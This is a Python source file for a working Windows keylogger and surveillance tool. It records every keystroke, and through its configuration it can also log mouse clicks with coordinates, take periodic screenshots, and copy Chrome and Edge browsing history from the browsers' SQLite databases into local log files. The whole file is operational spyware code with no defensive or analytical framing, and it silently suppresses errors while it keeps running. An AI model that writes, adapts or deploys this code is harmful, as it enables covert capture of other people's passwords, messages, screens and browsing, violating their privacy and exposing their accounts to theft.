import os, json, win32api, sqlite3
from pynput import keyboard, mouse
from time import sleep
from threading import Timer
from PIL.ImageGrab import grab as screenshot



# Returns the next filename in a sequence
def next_filename_index(folder: str, str_format: str):
    index = 0
    while ( os.path.exists( os.path.join(folder, str_format.format(index=index)) ) ):
        index += 1
    return os.path.join(folder, str_format.format(index=index))

# Returns the number of seconds since the last user input
def inactivity_seconds():
    return (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0

# Calls a function every x seconds
def set_interval(fun, sec: int):
    fun()
    Timer(sec, lambda:set_interval(fun, sec)).start()



# Last click
last_click = None

# Writes a string to the keylog file
def keylog_write_string(string: str):
    #print(string, end="")

    with open(os.path.join(CONFIG["logs_location"], CONFIG["keylogger"]["filename"]), "a+") as f:
        f.write(string)

    if (string == "[EXIT]"):
        raise os._exit(0)

# Writes a key press to the keylog file
def keylog_write_key(key: keyboard.Key):
    # Is a numpad key (weird behavior with these)
    if (hasattr(key, "vk") and key.vk >= 96 and key.vk <= 111):
        string = f"[{str(key.vk)}]"

    # Is an alphanumeric key
    elif (hasattr(key, "char") and key.char != None):
        # escape sequence (CTRL + key)
        if (len(str(key)[1:-1]) == 4):
            string = f"[CTRL^{str(chr(key.vk))}]"
        # no escape sequence
        else:
            string = str(key.char)

    # Is a special key
    elif (hasattr(key, "name")):
        string = f"[{str(key.name).upper()}]"

    # Is anything else (fallback)
    else:
        string = f"[{str(key)}]"

    if (string in CONFIG["keylogger"]["replace"]):
        string = CONFIG["keylogger"]["replace"][string]

    if (string == ""):
        return
    else:
        global last_click
        last_click = None

    keylog_write_string(string)

# Writes a mouse click to the keylog file
def keylog_write_click(x: int, y: int, button: mouse.Button, pressed: bool):
    if (pressed):
        string = button.name.upper()

        global last_click
        if (CONFIG["mouselogger"]["ignore_same"] and last_click == string):
            return
        else:
            last_click = string

        if (string in CONFIG["mouselogger"]["replace"]):
            string = CONFIG["mouselogger"]["replace"][string]

        if (string == ""):
            return

        letter = CONFIG["mouselogger"]["string_format"].format(btn=string, x=x, y=y)
        keylog_write_string(letter)



# Take a screenshot and save it
def take_screenshot():
    if (CONFIG["screenshot"]["inactivity_skip"] == False or inactivity_seconds() < CONFIG["screenshot"]["interval"]):
        screenshot().save(next_filename_index(CONFIG["logs_location"], CONFIG["screenshot"]["filename_format"]))



# Log a browser history file
def log_browser_history(name: str, path: str, query: str):
    if (os.path.exists(path) == False):
        return

    connection = sqlite3.connect(path)
    cursor = connection.cursor()

    cursor.execute(query)
    urls = list(sum(cursor.fetchall(), ()))

    cursor.close()
    connection.close()

    with open(os.path.join(CONFIG["logs_location"], f"{name}_history.txt"), "w+") as f:
        f.write("\n".join(urls))

# Scrape all browser history files
def scrape_browsers_history():
    CHROMIUM_QUERY = "select url from urls order by last_visit_time desc"
    CHROMIUM_PATH = os.path.join("User Data", "Default", "History")

    if (CONFIG["history"]["limit"] == None):
        QUERY_LIMIT = ""
    else:
        QUERY_LIMIT = " limit " + str(CONFIG["history"]["limit"])

    BROWSER_HISTORY_DICT = {
        "chrome": {
            "path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", CHROMIUM_PATH),
            "query": CHROMIUM_QUERY + QUERY_LIMIT
        },
        "edge": {
            "path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", CHROMIUM_PATH),
            "query": CHROMIUM_QUERY + QUERY_LIMIT
        }
    }

    for browser in BROWSER_HISTORY_DICT:
        log_browser_history(browser, BROWSER_HISTORY_DICT[browser]["path"], BROWSER_HISTORY_DICT[browser]["query"])



# Default config
CONFIG = {
    "logs_location": ".",
    "keylogger": {
        "enabled": True,
        "filename": "keylog.txt",
        "replace": {
            "[SPACE]": " ",
            "[F12]": "[EXIT]"
        }
    },
    "mouselogger": { "enabled": False },
    "screenshot": { "enabled": False },
    "history": { "enabled": False }
}


# Start logging
try:
    if (os.path.exists("config.json")):
        with open("config.json") as f:
            CONFIG = json.load(f)
    else:
        with open("config.json", "w+") as f:
            json.dump(CONFIG, f, indent=4)

    if (os.path.exists(CONFIG["logs_location"]) == False):
        os.mkdir(CONFIG["logs_location"])

    if (CONFIG["keylogger"]["enabled"]):
        keyboard.Listener(on_press=keylog_write_key).start()

    if (CONFIG["mouselogger"]["enabled"]):
        mouse.Listener(on_click=keylog_write_click).start()

    if (CONFIG["screenshot"]["enabled"]):
        set_interval(take_screenshot, CONFIG["screenshot"]["interval"])

    if (CONFIG["history"]["enabled"]):
        set_interval(scrape_browsers_history, CONFIG["history"]["interval"])

    # Keep the script running
    while True:
        sleep(3600)
except:
    pass